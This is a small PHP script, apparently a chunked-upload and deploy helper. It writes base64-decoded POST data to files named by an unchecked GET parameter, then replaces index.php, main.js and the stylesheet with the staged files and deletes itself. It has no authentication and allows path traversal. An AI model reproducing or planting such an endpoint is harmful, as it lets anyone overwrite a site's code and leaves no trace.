<?php
$fn = $_GET['f'] ?? '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $fn) {
    $data = file_get_contents('php://input');
    $fp = fopen(__DIR__ . '/' . $fn . '.tmp', 'a');
    fwrite($fp, base64_decode($data));
    fclose($fp);
    echo 'chunk OK';
    exit;
}
if ($fn === 'assemble') {
    $css = file_get_contents(__DIR__ . '/css.tmp');
    file_put_contents(__DIR__ . '/assets/css/style.css', $css);
    unlink(__DIR__ . '/css.tmp');
    copy(__DIR__ . '/ix.php', __DIR__ . '/index.php'); unlink(__DIR__ . '/ix.php');
    copy(__DIR__ . '/mj.js', __DIR__ . '/assets/js/main.js'); unlink(__DIR__ . '/mj.js');
    echo 'ALL DONE';
    unlink(__FILE__);
    exit;
}
echo 'OK';